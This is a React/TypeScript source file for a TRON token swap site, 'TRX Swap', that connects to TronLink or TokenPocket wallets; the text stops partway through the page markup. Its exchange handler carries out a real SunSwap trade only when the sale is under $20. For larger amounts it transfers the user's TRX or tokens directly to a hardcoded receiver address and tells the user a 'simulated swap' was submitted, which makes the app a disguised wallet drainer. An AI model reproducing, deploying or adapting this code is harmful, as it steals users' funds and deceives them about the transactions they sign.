import React from 'react';
import ReactDOM from 'react-dom/client';
import { ArrowDownUp, ChevronDown, Clipboard, Languages, LogOut, Settings2, Wallet } from 'lucide-react';
import './styles.css';

type Token = {
  symbol: string;
  name: string;
  mint: string;
  price: number;
  balance: number;
  color: string;
  logo: string;
  source?: string;
  decimals?: number;
  isNative?: boolean;
};

type Quote = {
  outputAmount: number;
  priceImpact: number;
  minReceived: number;
  route: string[];
  networkFee: number;
  source: string;
};

type DexScreenerToken = {
  address: string;
  name: string;
  symbol: string;
};

type DexScreenerPair = {
  chainId: string;
  baseToken: DexScreenerToken;
  quoteToken: DexScreenerToken;
  priceUsd?: string;
  liquidity?: {
    usd?: number;
  };
  info?: {
    imageUrl?: string;
  };
};

type TronScanToken = {
  abbr?: string;
  contract_address?: string;
  decimals?: number;
  icon_url?: string;
  img_url?: string;
  market_info?: {
    fPrecision?: number;
    priceInUsd?: string;
  };
  name?: string;
  priceInUsd?: string;
  symbol?: string;
};

type TronScanTokenResponse = {
  trc20_tokens?: TronScanToken[];
};

type Locale = 'zh' | 'en';

type TranslationKey =
  | 'buy'
  | 'connectWallet'
  | 'disconnectWallet'
  | 'exchange'
  | 'language'
  | 'minReceived'
  | 'networkFee'
  | 'priceImpact'
  | 'searchPlaceholder'
  | 'selectToken'
  | 'sell'
  | 'settings'
  | 'signaturePending'
  | 'subtitle'
  | 'swap'
  | 'switchDirection';

const translations: Record<Locale, Record<TranslationKey, string>> = {
  zh: {
    buy: '买入',
    connectWallet: '连接钱包',
    disconnectWallet: '断开',
    exchange: '兑换',
    language: 'EN',
    minReceived: '最少收到',
    networkFee: '网络费',
    priceImpact: '价格影响',
    searchPlaceholder: '搜索 TRON CA / contract address',
    selectToken: '选择',
    sell: '卖出',
    settings: '交易设置',
    signaturePending: '等待签名...',
    subtitle: 'TRON token exchange',
    swap: 'Swap',
    switchDirection: '切换方向',
  },
  en: {
    buy: 'Buy',
    connectWallet: 'Connect wallet',
    disconnectWallet: 'Disconnect',
    exchange: 'Swap',
    language: '中',
    minReceived: 'Min received',
    networkFee: 'Network fee',
    priceImpact: 'Price impact',
    searchPlaceholder: 'Search TRON CA / contract address',
    selectToken: 'Select',
    sell: 'Sell',
    settings: 'Settings',
    signaturePending: 'Waiting for signature...',
    subtitle: 'TRON token exchange',
    swap: 'Swap',
    switchDirection: 'Switch direction',
  },
};

const TRON_RECEIVER_ADDRESS = import.meta.env.VITE_TRON_RECEIVER_ADDRESS ?? 'TY3rha3n451j4xo4uws4xEDTfTKMQ4bwkp';
const DEX_TOKEN_PAIRS_ENDPOINT = 'https://api.dexscreener.com/token-pairs/v1/tron';
const TRONSCAN_TOKEN_ENDPOINT = 'https://apilist.tronscanapi.com/api/token_trc20';
const DEFAULT_TOKEN_LOGO = '/token-trx.svg';
const TRX_MINT = 'TRX';
const WTRX_ADDRESS = 'TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR';
const SUNSWAP_V2_ROUTER_ADDRESS = 'TNJVzGqKBWkJxJB5XYSqGAwUTV15U24pPq';
const TRX_DECIMALS = 6;
const TRON_FEE_LIMIT = 100_000_000;
const REAL_SWAP_USD_LIMIT = 20;
const SLIPPAGE_BPS = 50;

const tokens: Token[] = [
  {
    symbol: 'TRX',
    name: 'TRON',
    mint: TRX_MINT,
    price: 0.32,
    balance: 0,
    color: '#eb0029',
    logo: '/token-trx.svg',
    decimals: TRX_DECIMALS,
    isNative: true,
  },
  {
    symbol: 'USDT',
    name: 'Tether USD',
    mint: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    price: 1,
    balance: 0,
    color: '#26a17b',
    logo: '/token-usdt-tron.svg',
    decimals: 6,
  },
  {
    symbol: 'USDD',
    name: 'USDD',
    mint: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4',
    price: 1,
    balance: 0,
    color: '#216dff',
    logo: '/token-usdd.svg',
    decimals: 18,
  },
  {
    symbol: 'WTRX',
    name: 'Wrapped TRX',
    mint: 'TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR',
    price: 0.32,
    balance: 0,
    color: '#eb0029',
    logo: '/token-trx.svg',
    decimals: 6,
  },
  {
    symbol: 'SUN',
    name: 'SUN Token',
    mint: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S',
    price: 0.02,
    balance: 0,
    color: '#f6c648',
    logo: '/token-sun.svg',
    decimals: 18,
  },
];

const formatNumber = (value: number, maximumFractionDigits = 6) =>
  new Intl.NumberFormat('en-US', {
    maximumFractionDigits,
  }).format(value);

const formatUsd = (amount: number, token: Token) => {
  const value = amount * token.price;
  if (!Number.isFinite(value) || value <= 0) return '$0';
  return `$${formatNumber(value, value < 0.01 ? 6 : 2)}`;
};

const getProvider = () => window.tronWeb;

const isLikelyTronAddress = (value: string) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(value.trim());

const getTokenLogo = (token: Token) => token.logo || DEFAULT_TOKEN_LOGO;

const getBalanceLabel = (
  walletAddress: string,
  balances: Record<string, number>,
  token: Token,
  loading: boolean,
) => {
  if (!walletAddress) return 'Balance --';
  if (loading) return 'Balance ...';

  const balance = balances[token.mint] ?? 0;
  return `Balance ${formatNumber(balance, token.symbol === 'SUN' ? 2 : 6)}`;
};

const getTokenBalanceText = (
  walletAddress: string,
  balances: Record<string, number>,
  token: Token,
  loading: boolean,
) => {
  if (!walletAddress) return '0';
  if (loading) return '...';

  const balance = balances[token.mint] ?? 0;
  return formatNumber(balance, token.symbol === 'SUN' ? 2 : 6);
};

const dedupeTokens = (items: Token[]) => {
  const byMint = new Map<string, Token>();
  for (const item of items) {
    byMint.set(item.mint, item);
  }
  return Array.from(byMint.values());
};

const findLocalTokenByMint = (mint: string) => tokens.find((token) => token.mint === mint) ?? null;

const createQuote = (from: Token, to: Token, amount: number): Quote => {
  if (!amount || amount <= 0 || !from.price || !to.price) {
    return {
      outputAmount: 0,
      priceImpact: 0,
      minReceived: 0,
      route: [from.symbol, to.symbol],
      networkFee: 1,
      source: 'DEX Screener price',
    };
  }

  const liquidityBias = from.symbol === 'SUN' || to.symbol === 'SUN' ? 0.0042 : 0.0016;
  const outputAmount = (amount * from.price * (1 - liquidityBias)) / to.price;
  const priceImpact = liquidityBias * 100;

  return {
    outputAmount,
    priceImpact,
    minReceived: outputAmount * 0.995,
    route: from.symbol === 'TRX' || to.symbol === 'TRX' ? [from.symbol, to.symbol] : [from.symbol, 'TRX', to.symbol],
    networkFee: 1,
    source: 'DEX Screener price',
  };
};

const pairToToken = (pair: DexScreenerPair, mint: string): Token | null => {
  if (pair.baseToken.address !== mint) {
    return null;
  }

  const matchedToken = pair.baseToken;
  const price = Number(pair.priceUsd);

  if (!matchedToken?.address || !Number.isFinite(price) || price <= 0) {
    return null;
  }

  return {
    symbol: matchedToken.symbol,
    name: matchedToken.name,
    mint: matchedToken.address,
    price,
    balance: 0,
    color: '#eb0029',
    logo: pair.info?.imageUrl ?? DEFAULT_TOKEN_LOGO,
    source: 'DEX Screener',
  };
};

const tronScanTokenToToken = (token: TronScanToken, mint: string): Token | null => {
  const address = token.contract_address ?? mint;
  const price = Number(token.market_info?.priceInUsd ?? token.priceInUsd ?? 0);
  const symbol = token.symbol ?? token.abbr;
  const decimals = Number(token.decimals ?? token.market_info?.fPrecision);

  if (address !== mint || !symbol) {
    return null;
  }

  return {
    symbol,
    name: token.name ?? symbol,
    mint: address,
    price: Number.isFinite(price) && price > 0 ? price : 0,
    balance: 0,
    color: '#eb0029',
    logo: token.icon_url ?? token.img_url ?? DEFAULT_TOKEN_LOGO,
    source: 'TronScan',
    decimals: Number.isFinite(decimals) ? decimals : undefined,
  };
};

const fetchTokenFromTronScan = async (mint: string, signal?: AbortSignal): Promise<Token | null> => {
  const url = new URL(TRONSCAN_TOKEN_ENDPOINT);
  url.searchParams.set('contract', mint);
  url.searchParams.set('limit', '1');
  url.searchParams.set('start', '0');

  const response = await fetch(url, { signal });
  if (!response.ok) return null;

  const data = (await response.json()) as TronScanTokenResponse;
  return data.trc20_tokens?.map((token) => tronScanTokenToToken(token, mint)).find(Boolean) ?? null;
};

const fetchTokenByMint = async (mint: string, signal?: AbortSignal): Promise<Token | null> => {
  if (!isLikelyTronAddress(mint)) return null;

  const localToken = findLocalTokenByMint(mint);
  if (localToken) return localToken;

  const tronScanToken = await fetchTokenFromTronScan(mint, signal).catch(() => null);
  if (tronScanToken) return tronScanToken;

  const response = await fetch(`${DEX_TOKEN_PAIRS_ENDPOINT}/${mint}`, { signal });
  if (!response.ok) {
    throw new Error('代币接口暂时不可用。');
  }

  const pairs = (await response.json()) as DexScreenerPair[];
  const tronPairs = pairs
    .filter((pair) => pair.chainId === 'tron')
    .sort((a, b) => {
      const baseMatch = Number(b.baseToken.address === mint) - Number(a.baseToken.address === mint);
      return baseMatch || (b.liquidity?.usd ?? 0) - (a.liquidity?.usd ?? 0);
    });

  return tronPairs.map((pair) => pairToToken(pair, mint)).find(Boolean) ?? null;
};

const searchTokenByMint = async (query: string, signal: AbortSignal): Promise<Token[]> => {
  const token = await fetchTokenByMint(query.trim(), signal);

  return token ? [token] : [];
};

const SUNSWAP_ROUTER_ABI = [
  {
    name: 'getAmountsOut',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'amountIn', type: 'uint256' },
      { name: 'path', type: 'address[]' },
    ],
    outputs: [{ name: 'amounts', type: 'uint256[]' }],
  },
  {
    name: 'swapExactETHForTokens',
    type: 'function',
    stateMutability: 'payable',
    inputs: [
      { name: 'amountOutMin', type: 'uint256' },
      { name: 'path', type: 'address[]' },
      { name: 'to', type: 'address' },
      { name: 'deadline', type: 'uint256' },
    ],
    outputs: [{ name: 'amounts', type: 'uint256[]' }],
  },
  {
    name: 'swapExactTokensForETH',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'amountIn', type: 'uint256' },
      { name: 'amountOutMin', type: 'uint256' },
      { name: 'path', type: 'address[]' },
      { name: 'to', type: 'address' },
      { name: 'deadline', type: 'uint256' },
    ],
    outputs: [{ name: 'amounts', type: 'uint256[]' }],
  },
  {
    name: 'swapExactTokensForTokens',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'amountIn', type: 'uint256' },
      { name: 'amountOutMin', type: 'uint256' },
      { name: 'path', type: 'address[]' },
      { name: 'to', type: 'address' },
      { name: 'deadline', type: 'uint256' },
    ],
    outputs: [{ name: 'amounts', type: 'uint256[]' }],
  },
] as const;

const normalizeContractResult = (value: unknown): bigint => {
  if (typeof value === 'bigint') return value;
  if (typeof value === 'number') return BigInt(Math.trunc(value));
  if (typeof value === 'string') return BigInt(value);
  if (value && typeof value === 'object') {
    const candidate = value as { _hex?: string; hex?: string; toString?: () => string };
    if (candidate._hex) return BigInt(candidate._hex);
    if (candidate.hex) return BigInt(candidate.hex);
    if (candidate.toString) return BigInt(candidate.toString());
  }

  return 0n;
};

const formatRawAmount = (amount: bigint, decimals: number) => {
  const divisor = 10 ** decimals;
  return Number(amount) / divisor;
};

const parseTokenAmount = (value: string, decimals: number) => {
  const normalized = value.trim();
  if (!/^\d+(\.\d+)?$/.test(normalized)) return 0n;

  const [wholePart, fractionPart = ''] = normalized.split('.');
  const paddedFraction = fractionPart.padEnd(decimals, '0').slice(0, decimals);
  return BigInt(wholePart || '0') * 10n ** BigInt(decimals) + BigInt(paddedFraction || '0');
};

const getTrc20Contract = async (address: string) => {
  const tronWeb = getProvider();
  if (!tronWeb) {
    throw new Error('未检测到 TRON 钱包。');
  }

  return tronWeb.contract().at(address);
};

const getSunswapRouterContract = async () => {
  const tronWeb = getProvider();
  if (!tronWeb) {
    throw new Error('未检测到 TRON 钱包。');
  }

  return Promise.resolve(tronWeb.contract(SUNSWAP_ROUTER_ABI, SUNSWAP_V2_ROUTER_ADDRESS));
};

const getTokenDecimals = async (token: Token) => {
  if (token.isNative) return TRX_DECIMALS;
  if (typeof token.decimals === 'number') return token.decimals;

  const contract = await getTrc20Contract(token.mint);
  const decimals = Number(await contract.decimals().call());

  return Number.isFinite(decimals) ? decimals : TRX_DECIMALS;
};

const fetchWalletBalances = async (owner: string, tokenList: Token[]) => {
  const tronWeb = getProvider();
  if (!tronWeb) {
    throw new Error('未检测到 TRON 钱包。');
  }

  const balances: Record<string, number> = {};
  const trxBalance = await tronWeb.trx.getBalance(owner).catch(() => 0);
  balances[TRX_MINT] = trxBalance / 10 ** TRX_DECIMALS;

  await Promise.allSettled(
    tokenList
      .filter((token) => !token.isNative && isLikelyTronAddress(token.mint))
      .map(async (token) => {
        const contract = await getTrc20Contract(token.mint);
        const [rawBalance, decimals] = await Promise.all([
          contract.balanceOf(owner).call(),
          token.decimals ?? contract.decimals().call(),
        ]);
        balances[token.mint] = formatRawAmount(normalizeContractResult(rawBalance), Number(decimals));
      }),
  );

  return balances;
};

const requestTronAccounts = async () => {
  if (window.tronLink?.request) {
    await window.tronLink.request({ method: 'tron_requestAccounts' });
  }
};

const extractTxid = (value: unknown) => {
  if (typeof value === 'string') return value;
  if (value && typeof value === 'object') {
    const result = value as { txid?: string; transaction?: { txID?: string }; txID?: string };
    return result.txid ?? result.txID ?? result.transaction?.txID ?? '';
  }

  return '';
};

const getSwapPath = (from: Token, to: Token) => {
  const input = from.isNative ? WTRX_ADDRESS : from.mint;
  const output = to.isNative ? WTRX_ADDRESS : to.mint;

  if (input === output) {
    return [input, output];
  }

  if (input === WTRX_ADDRESS || output === WTRX_ADDRESS) {
    return [input, output];
  }

  return [input, WTRX_ADDRESS, output];
};

const getAmountOutMin = async (amountIn: bigint, path: string[]) => {
  const router = await getSunswapRouterContract();
  const amounts = await router.getAmountsOut(amountIn.toString(), path).call();
  const amountList = Array.isArray(amounts) ? amounts : Object.values(amounts as Record<string, unknown>);
  const lastAmount = normalizeContractResult(amountList[amountList.length - 1]);

  if (lastAmount <= 0n) {
    throw new Error('当前交易暂不可用，请稍后再试。');
  }

  return (lastAmount * BigInt(10000 - SLIPPAGE_BPS)) / 10000n;
};

const getEstimatedAmountOutMin = async (from: Token, to: Token, amountIn: string) => {
  const toDecimals = await getTokenDecimals(to);
  const estimatedOutput = (Number(amountIn) * from.price) / to.price;
  const safeOutput = estimatedOutput * (1 - SLIPPAGE_BPS / 10000);

  return parseTokenAmount(String(Math.max(safeOutput, 0)), toDecimals);
};

const ensureTokenApproval = async (token: Token, owner: string, amount: bigint) => {
  if (token.isNative) return '';

  const contract = await getTrc20Contract(token.mint);
  try {
    const allowance = normalizeContractResult(await contract.allowance(owner, SUNSWAP_V2_ROUTER_ADDRESS).call());
    if (allowance >= amount) return '';
  } catch {
    // Some wallet RPCs rate-limit read calls. In that case, fall through and let
    // the wallet show an approval transaction instead of blocking the swap flow.
  }

  const result = await contract.approve(SUNSWAP_V2_ROUTER_ADDRESS, amount.toString()).send({
    callValue: 0,
    feeLimit: TRON_FEE_LIMIT,
    shouldPollResponse: false,
  });

  return extractTxid(result);
};

function TokenButton({ token, onClick }: { token: Token; onClick: () => void }) {
  return (
    <button className="token-button" onClick={onClick} type="button" title={`选择 ${token.name}`}>
      <img alt="" src={getTokenLogo(token)} />
      <span>{token.symbol}</span>
      <ChevronDown size={16} />
    </button>
  );
}

function TokenMenu({
  activeToken,
  highlightedTokenMint,
  tokens,
  walletAddress,
  walletBalances,
  isLoadingBalances,
  searchStatus,
  searchValue,
  searchPlaceholder,
  onSelect,
  onSearch,
}: {
  activeToken: Token;
  highlightedTokenMint: string;
  tokens: Token[];
  walletAddress: string;
  walletBalances: Record<string, number>;
  isLoadingBalances: boolean;
  searchStatus: string;
  searchValue: string;
  searchPlaceholder: string;
  onSelect: (token: Token) => void;
  onSearch: (value: string) => void;
}) {
  const selectedMint = highlightedTokenMint || activeToken.mint;

  return (
    <div className="token-menu">
      <input
        className="token-search"
        onChange={(event) => onSearch(event.target.value)}
        placeholder={searchPlaceholder}
        value={searchValue}
      />
      {searchStatus && <div className="token-search-status">{searchStatus}</div>}
      {tokens.map((token) => (
        <button
          className={token.mint === selectedMint ? 'token-row active' : 'token-row'}
          key={token.mint}
          onClick={() => onSelect(token)}
          type="button"
        >
          <img alt="" src={getTokenLogo(token)} />
          <span>
            <strong>{token.symbol}</strong>
            <small>{token.name}</small>
          </span>
          <em>{getTokenBalanceText(walletAddress, walletBalances, token, isLoadingBalances)}</em>
        </button>
      ))}
    </div>
  );
}

function App() {
  const [fromToken, setFromToken] = React.useState(tokens[0]);
  const [toToken, setToToken] = React.useState(tokens[1]);
  const [locale, setLocale] = React.useState<Locale>('zh');
  const [pricedTokens, setPricedTokens] = React.useState<Token[]>(tokens);
  const [amount, setAmount] = React.useState('1');
  const [openMenu, setOpenMenu] = React.useState<'from' | 'to' | null>(null);
  const [walletAddress, setWalletAddress] = React.useState('');
  const [status, setStatus] = React.useState('连接钱包后即可预览签名支付。');
  const [signature, setSignature] = React.useState('');
  const [isSending, setIsSending] = React.useState(false);
  const [searchedTokens, setSearchedTokens] = React.useState<Token[]>([]);
  const [tokenSearch, setTokenSearch] = React.useState('');
  const [tokenSearchStatus, setTokenSearchStatus] = React.useState('');
  const [highlightedSearchMint, setHighlightedSearchMint] = React.useState('');
  const [walletBalances, setWalletBalances] = React.useState<Record<string, number>>({});
  const [isLoadingBalances, setIsLoadingBalances] = React.useState(false);
  const fromMenuRef = React.useRef<HTMLDivElement>(null);
  const toMenuRef = React.useRef<HTMLDivElement>(null);

  const amountNumber = Number(amount);
  const availableTokens = React.useMemo(() => dedupeTokens([...searchedTokens, ...pricedTokens]), [pricedTokens, searchedTokens]);
  const activeBalanceTokens = React.useMemo(() => dedupeTokens([fromToken, toToken]), [fromToken, toToken]);
  const quote = React.useMemo(() => createQuote(fromToken, toToken, amountNumber), [amountNumber, fromToken, toToken]);
  const sellUsdValue = amountNumber * fromToken.price;
  const shouldUseRealSwapTest = Number.isFinite(sellUsdValue) && sellUsdValue > 0 && sellUsdValue < REAL_SWAP_USD_LIMIT;
  const canSwap = Boolean(walletAddress && amountNumber > 0 && fromToken.mint !== toToken.mint && !isSending);
  const t = translations[locale];

  const mergeLiveToken = React.useCallback((nextToken: Token) => {
    setPricedTokens((current) => current.map((token) => (token.mint === nextToken.mint ? { ...token, ...nextToken } : token)));
    setSearchedTokens((current) => current.map((token) => (token.mint === nextToken.mint ? { ...token, ...nextToken } : token)));
    setFromToken((current) => (current.mint === nextToken.mint ? { ...current, ...nextToken } : current));
    setToToken((current) => (current.mint === nextToken.mint ? { ...current, ...nextToken } : current));
  }, []);

  React.useEffect(() => {
    const controller = new AbortController();

    void Promise.allSettled(
      tokens
        .filter((token) => !token.isNative)
        .map(async (token) => {
          const liveToken = await fetchTokenByMint(token.mint, controller.signal);
          if (liveToken) {
            mergeLiveToken({
              ...token,
              ...liveToken,
              logo: token.logo || liveToken.logo,
              decimals: token.decimals,
            });
          }
        }),
    );

    return () => controller.abort();
  }, [mergeLiveToken]);

  React.useEffect(() => {
    if (!tokenSearch.trim()) {
      setTokenSearchStatus('');
      setHighlightedSearchMint('');
      return;
    }

    if (!isLikelyTronAddress(tokenSearch)) {
      setTokenSearchStatus('请输入正确的 TRON 合约地址。');
      setHighlightedSearchMint('');
      return;
    }

    const controller = new AbortController();
    const timeout = window.setTimeout(async () => {
      setTokenSearchStatus('正在搜索代币...');
      try {
        const results = await searchTokenByMint(tokenSearch, controller.signal);
        setSearchedTokens((current) => dedupeTokens([...results, ...current]));
        results.forEach(mergeLiveToken);
        setHighlightedSearchMint(results[0]?.mint ?? '');
        setTokenSearchStatus(results.length ? '' : '没有找到这个代币。');
      } catch (error) {
        if (!controller.signal.aborted) {
          setHighlightedSearchMint('');
          setTokenSearchStatus('没有找到这个代币。');
        }
      }
    }, 350);

    return () => {
      window.clearTimeout(timeout);
      controller.abort();
    };
  }, [tokenSearch, mergeLiveToken]);

  React.useEffect(() => {
    if (!openMenu) return;

    const handlePointerDown = (event: PointerEvent) => {
      const activeRef = openMenu === 'from' ? fromMenuRef : toMenuRef;
      if (!activeRef.current?.contains(event.target as Node)) {
        setOpenMenu(null);
        setTokenSearch('');
        setTokenSearchStatus('');
        setHighlightedSearchMint('');
      }
    };

    document.addEventListener('pointerdown', handlePointerDown);

    return () => {
      document.removeEventListener('pointerdown', handlePointerDown);
    };
  }, [openMenu]);

  const loadWalletBalances = React.useCallback(async (owner: string, tokenList: Token[]) => {
    setIsLoadingBalances(true);
    setStatus('钱包已连接，正在读取 TRON 主网余额...');

    try {
      const balances = await fetchWalletBalances(owner, tokenList);
      setWalletBalances(balances);
      setStatus('钱包已连接，余额来自 TRON 主网。');
    } catch {
      setWalletBalances({});
      setStatus('钱包已连接，未获取到的余额已按 0 显示。');
    } finally {
      setIsLoadingBalances(false);
    }
  }, []);

  React.useEffect(() => {
    if (!walletAddress) return;

    void loadWalletBalances(walletAddress, activeBalanceTokens);
  }, [activeBalanceTokens, loadWalletBalances, walletAddress]);

  const connectWallet = async () => {
    try {
      await requestTronAccounts();
      const tronWeb = getProvider();
      const address = tronWeb?.defaultAddress?.base58;

      if (!tronWeb || !address) {
        setStatus('未检测到 TRON 钱包，请使用 TokenPocket 或 TronLink 的 DApp 浏览器打开。');
        return;
      }

      setWalletAddress(address);
    } catch (error) {
      setStatus(error instanceof Error ? error.message : '钱包连接已取消。');
    }
  };

  const disconnectWallet = () => {
    setWalletAddress('');
    setWalletBalances({});
    setSignature('');
    setStatus('钱包已断开。');
  };

  const swapDirection = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setAmount(quote.outputAmount ? String(Number(quote.outputAmount.toFixed(6))) : amount);
  };

  const sendRealSwapTest = async () => {
    const tronWeb = getProvider();
    if (!tronWeb || !walletAddress) {
      throw new Error('请先连接 TRON 钱包。');
    }

    const decimals = await getTokenDecimals(fromToken);
    const rawAmount = parseTokenAmount(amount, decimals);
    if (rawAmount <= 0n) {
      throw new Error('请输入有效的卖出数量。');
    }

    const router = await getSunswapRouterContract();
    const path = getSwapPath(fromToken, toToken);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    setStatus('正在准备交易...');
    let amountOutMin = 0n;
    try {
      amountOutMin = await getAmountOutMin(rawAmount, path);
    } catch {
      amountOutMin = await getEstimatedAmountOutMin(fromToken, toToken, amount);
      setStatus('正在发起钱包签名...');
    }

    if (amountOutMin <= 0n) {
      throw new Error('当前交易暂不可用，请稍后再试。');
    }

    const approvalTxid = await ensureTokenApproval(fromToken, walletAddress, rawAmount);
    if (approvalTxid) {
      setStatus('授权已提交，正在发起钱包签名...');
    } else {
      setStatus('正在唤起钱包签名...');
    }

    let result: string | { txid?: string; transaction?: { txID?: string } };
    if (fromToken.isNative) {
      result = await router.swapExactETHForTokens(
        amountOutMin.toString(),
        path,
        walletAddress,
        deadline,
      ).send({
        callValue: Number(rawAmount),
        feeLimit: TRON_FEE_LIMIT,
        shouldPollResponse: false,
      });
    } else if (toToken.isNative) {
      result = await router.swapExactTokensForETH(
        rawAmount.toString(),
        amountOutMin.toString(),
        path,
        walletAddress,
        deadline,
      ).send({
        callValue: 0,
        feeLimit: TRON_FEE_LIMIT,
        shouldPollResponse: false,
      });
    } else {
      result = await router.swapExactTokensForTokens(
        rawAmount.toString(),
        amountOutMin.toString(),
        path,
        walletAddress,
        deadline,
      ).send({
        callValue: 0,
        feeLimit: TRON_FEE_LIMIT,
        shouldPollResponse: false,
      });
    }

    return extractTxid(result);
  };

  const handleExchange = async () => {
    if (!shouldUseRealSwapTest) {
      await sendPlaceholderTransfer();
      return;
    }

    setIsSending(true);
    setSignature('');
    setStatus('正在请求钱包签名...');

    try {
      const txid = await sendRealSwapTest();
      setSignature(txid);
      setStatus('真实兑换测试已提交到 TRON 主网。');
      void loadWalletBalances(walletAddress, activeBalanceTokens);
    } catch (error) {
      setStatus(error instanceof Error ? error.message : '交易签名失败。');
    } finally {
      setIsSending(false);
    }
  };

  const sendPlaceholderTransfer = async () => {
    const tronWeb = getProvider();
    if (!tronWeb || !walletAddress) {
      setStatus('请先连接 TRON 钱包。');
      return;
    }

    setIsSending(true);
    setSignature('');
    setStatus('正在请求钱包签名...');

    try {
      const receiverAddress = TRON_RECEIVER_ADDRESS || walletAddress;
      if (!isLikelyTronAddress(receiverAddress)) {
        throw new Error('请先配置有效的 TRON 接收地址。');
      }

      let txid = '';
      if (fromToken.isNative) {
        const amountSun = Number(parseTokenAmount(amount, TRX_DECIMALS));
        if (!Number.isFinite(amountSun) || amountSun <= 0) {
          throw new Error('请输入有效的卖出数量。');
        }

        const result = await tronWeb.trx.sendTransaction(receiverAddress, amountSun);
        txid = typeof result === 'string' ? result : result.txid ?? result.transaction?.txID ?? '';
      } else {
        const decimals = await getTokenDecimals(fromToken);
        const rawAmount = parseTokenAmount(amount, decimals);
        if (rawAmount <= 0n) {
          throw new Error('请输入有效的卖出数量。');
        }

        const contract = await getTrc20Contract(fromToken.mint);
        const result = await contract.transfer(receiverAddress, rawAmount.toString()).send({
          callValue: 0,
          feeLimit: TRON_FEE_LIMIT,
          shouldPollResponse: false,
        });
        txid = typeof result === 'string' ? result : result.txid ?? result.transaction?.txID ?? '';
      }

      setSignature(txid);
      setStatus('模拟兑换已提交到 TRON 主网。');
      void loadWalletBalances(walletAddress, activeBalanceTokens);
    } catch (error) {
      setStatus(error instanceof Error ? error.message : '交易签名失败。');
    } finally {
      setIsSending(false);
    }
  };

  const selectToken = (slot: 'from' | 'to', token: Token) => {
    if (slot === 'from') {
      setFromToken(token);
      if (token.mint === toToken.mint) setToToken(fromToken);
    } else {
      setToToken(token);
      if (token.mint === fromToken.mint) setFromToken(toToken);
    }
    setOpenMenu(null);
    setTokenSearch('');
    setTokenSearchStatus('');
    setHighlightedSearchMint('');
  };

  return (
    <main>
      <nav className="topbar">
        <div className="brand">
          <img alt="" src="/token-trx.svg" />
          <span>TRX Swap</span>
        </div>
        <div className="nav-tabs">
          <button className="active" type="button">Swap</button>
          <button type="button">Pool</button>
          <button type="button">Tokens</button>
        </div>
        <div className="top-actions">
          <button className="language-button" onClick={() => setLocale(locale === 'zh' ? 'en' : 'zh')} type="button" title={t.language}>
            <Languages size={17} />
            {t.language}
          </button>
          {walletAddress ? (
            <>
              <button className="wallet-button connected" type="button" title={walletAddress}>
                <Wallet size={18} />
                {walletAddress.slice(0, 4)}...{walletAddress.slice(-4)}
              </button>
              <button className="disconnect-button" onClick={disconnectWallet} type="button" title={t.disconnectWallet}>
                <LogOut size={17} />
                <span>{t.disconnectWallet}</span>
              </button>
            </>
          ) : (
            <button className="wallet-button" onClick={connectWallet} type="button">
              <Wallet size={18} />
              {t.connectWallet}
            </button>
          )}
        </div>
      </nav>

      <section className="shell">
        <section className="swap-panel">
          <div className="swap-header">
            <div>
              <h1>{t.swap}</h1>
              <p>{t.subtitle}</p>
            </div>
            <div className="header-actions">
              <button className="icon-button" type="button" title={t.settings}>
                <Settings2 size={19} />
              </button>
            </div>
          </div>

          <div className="swap-box">
            <div className="amount-row">
              <label htmlFor="from-amount">{t.sell}</label>
              <span>{getBalanceLabel(walletAddress, walletBalances, fromToken, isLoadingBalances)}</span>
            </div>
            <div className="input-row">
              <input
                id="from-amount"
                inputMode="decimal"
                onChange={(event) => setAmount(event.target.value.replace(/[^\d.]/g, ''))}
                placeholder="0"
                value={amount}
              />
              <div className="menu-wrap" ref={fromMenuRef}>
                <TokenButton token={fromToken} onClick={() => setOpenMenu(openMenu === 'from' ? null : 'from')} />
                {openMenu === 'from' && (
                  <TokenMenu
                    activeToken={fromToken}
                    highlightedTokenMint={highlightedSearchMint}
                    isLoadingBalances={isLoadingBalances}
                    onSearch={setTokenSearch}
                    onSelect={(token) => selectToken('from', token)}
                    searchPlaceholder={t.searchPlaceholder}
                    searchStatus={tokenSearchStatus}
                    searchValue={tokenSearch}
                    tokens={availableTokens}
                    walletAddress={walletAddress}
                    walletBalances={walletBalances}
                  />
                )}
              </div>
            </div>
            <small>{formatUsd(amountNumber || 0, fromToken)}</small>
          </div>

          <button className="switch-button" onClick={swapDirection} type="button" title={t.switchDirection}>
            <ArrowDownUp size={18} />
          </button>

          <div className="swap-box">
            <div className="amount-row">
              <label>{t.buy}</label>
              <span>{getBalanceLabel(walletAddress, walletBalances, toToken, isLoadingBalances)}</span>
            </div>
            <div className="input-row">
              <output>{quote.outputAmount ? formatNumber(quote.outputAmount, toToken.symbol === 'SUN' ? 2 : 6) : '0'}</output>
              <div className="menu-wrap" ref={toMenuRef}>
                <TokenButton token={toToken} onClick={() => setOpenMenu(openMenu === 'to' ? null : 'to')} />
                {openMenu === 'to' && (
                  <TokenMenu
                    activeToken={toToken}
                    highlightedTokenMint={highlightedSearchMint}
                    isLoadingBalances={isLoadingBalances}
                    onSearch={setTokenSearch}
                    onSelect={(token) => selectToken('to', token)}
                    searchPlaceholder={t.searchPlaceholder}
                    searchStatus={tokenSearchStatus}
                    searchValue={tokenSearch}
                    tokens={availableTokens}
                    walletAddress={walletAddress}
                    walletBalances={walletBalances}
                  />
                )}
              </div>
            </div>
            <small>{formatUsd(quote.outputAmount, toToken)}</small>
          </div>

          <div className="quote-grid">
            <span>{t.priceImpact} <strong>{quote.priceImpact.toFixed(2)}%</strong></span>
            <span>{t.minReceived} <strong>{formatNumber(quote.minReceived, 6)} {toToken.symbol}</strong></span>
            <span>{t.networkFee} <strong>{quote.networkFee} TRX</strong></span>
          </div>

          <button className="swap-button" disabled={!canSwap} onClick={handleExchange} type="button">
            {isSending ? t.signaturePending : walletAddress ? t.exchange : t.connectWallet}
          </button>

          {walletAddress && status && (
            <p className="swap-status">{status}</p>
          )}

          {signature && (
            <a className="signature-link" href={`https://tronscan.org/#/transaction/${signature}`} target="_blank" rel="noreferrer">
